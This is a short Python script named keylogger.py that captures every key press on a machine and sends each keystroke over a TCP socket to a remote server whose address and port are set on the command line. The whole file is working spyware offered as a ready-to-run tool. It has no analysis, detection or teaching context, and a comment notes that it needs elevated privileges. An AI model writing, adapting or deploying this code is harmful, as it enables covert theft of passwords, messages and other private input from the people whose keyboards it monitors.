#need elevated privileges
import keyboard
import socket
import argparse

parser = argparse.ArgumentParser(prog="keylogger.py",
                                 description="keylogger in python, send keystroke to a specified remote server")
parser.add_argument("-t", "--target", default="127.0.0.1", type=str, required=False, help="target ipv4")
parser.add_argument("-p", "--port", default=1234, type=int, required=False, help="target port")
args = parser.parse_args()

#server will listen for incoming connection
SERVER_IP = args.target
SERVER_PORT = args.port
BUFFER_SIZE=1024

#create a socket
s = socket.socket()
s.connect((SERVER_IP, SERVER_PORT))

def keylogger(event):
    """
    callback function called each time a key is pressed
    :param event:
    :return:
    """

    s.send(event.name.encode())

keyboard.on_press(keylogger)
keyboard.wait()